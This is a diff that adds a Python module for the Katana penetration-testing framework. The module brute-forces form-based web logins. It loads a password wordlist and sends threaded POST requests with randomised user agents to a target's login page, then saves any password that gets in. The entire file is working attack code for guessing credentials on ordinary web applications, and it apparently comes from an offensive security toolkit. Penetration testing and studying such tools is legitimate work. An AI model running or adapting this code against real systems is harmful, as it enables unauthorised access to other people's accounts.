@@ -1,0 +1,94 @@
+# This module requires katana framework 
+# https://github.com/PowerScript/KatanaFramework
+
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+# Katana Core import                  #
+from core.KATANAFRAMEWORK import *    #
+# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
+
+# LIBRARIES  
+from core.Function import isLive,RamdonAgent,saveRegister
+import httplib,urllib,threading,time
+# END LIBRARIES 
+
+# INFORMATION MODULE
+def init():
+	init.Author             ="RedToor"
+	init.Version            ="1.3"
+	init.Description        ="Brute Force to Form-based in Webs application."
+	init.CodeName           ="web/bt.form"
+	init.DateCreation       ="28/02/2015"      
+	init.LastModification   ="26/05/2016"
+	init.References         =None
+	init.License            =KTF_LINCENSE
+	init.var                ={}
+
+	# DEFAULT OPTIONS MODULE
+	init.options = {
+		# NAME    VALUE                RQ     DESCRIPTION
+		'target':[LOCAL_IP            ,True ,'Host Target'],
+		'port'  :[HTTP_PORT           ,False,'Port Target'],
+		'file'  :["/login.php"        ,True ,'File request'],
+		'user'  :[USERNAME            ,True ,'Username target'],
+		'dict'  :["files/db/Routerpass.dicc" ,False,'Wordlist'],
+		'data_a':["username"          ,True ,'Name value 1'],
+		'data_b':["password"          ,True ,'Name value 2'],
+		'method':["POST"              ,True ,'Method form'],
+		'alert' :["NO"                ,True ,'error login']
+	}
+
+	# EXTRA OPTIONS MODULE
+	init.extra = {
+		# NAME    VALUE                RQ     DESCRIPTION
+		'sleep'  :["0"               ,False,'Time of sleep'],
+		'threads':["0"               ,False,'Number\'s threads']
+	}
+	return init
+# CODE MODULE    ############################################################################################
+def main(run):
+
+	isLive(init.var['target'],init.var['port'])
+	Loadingfile(init.var['dict'])
+
+	PASSWORDS_REC = []
+	global STATE
+	STATE=False
+
+	with open(init.var['dict'],'r') as passwords:
+		for password in passwords:
+			password=password.replace("\n","")
+			PASSWORDS_REC.append(password)
+
+			if int(init.var['threads']) == 0:
+				if request_thread(password):return
+
+			if len(PASSWORDS_REC) > int(init.var['threads']) and int(init.var['threads']) != 0:
+				for test_password in PASSWORDS_REC:
+					if STATE:return
+					t = threading.Thread(target=request_thread,args=(test_password,))
+					t.start()
+				time.sleep(int(init.var['sleep']))
+				PASSWORDS_REC = []
+
+	printAlert(4," No Result :c\n")
+
+def request_thread(password):
+	#@password : Password for Test in Service.
+
+	global STATE
+	params = urllib.urlencode({init.var['data_a']: init.var['user'], init.var['data_b']: password})
+	header={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain" , "User-agent" : RamdonAgent()}
+	conn = httplib.HTTPConnection(init.var['target'],init.var['port'])
+	conn.request(init.var['method'], init.var['file'], params, header)
+	response = conn.getresponse()
+	ver_source = response.read()
+
+	if ver_source.find(init.var['alert']) != 0 and response.status == 200:
+		printAlert(3,"Successfully with ["+init.var['data_a']+"="+init.var['user']+"]["+init.var['data_b']+"="+password+"]\n")
+		saveRegister(init,password)
+		STATE = True
+		return True
+	else:
+		if STATE==False:printAlert(0," | Checking '"+password+"'")
+
+# END CODE MODULE ############################################################################################
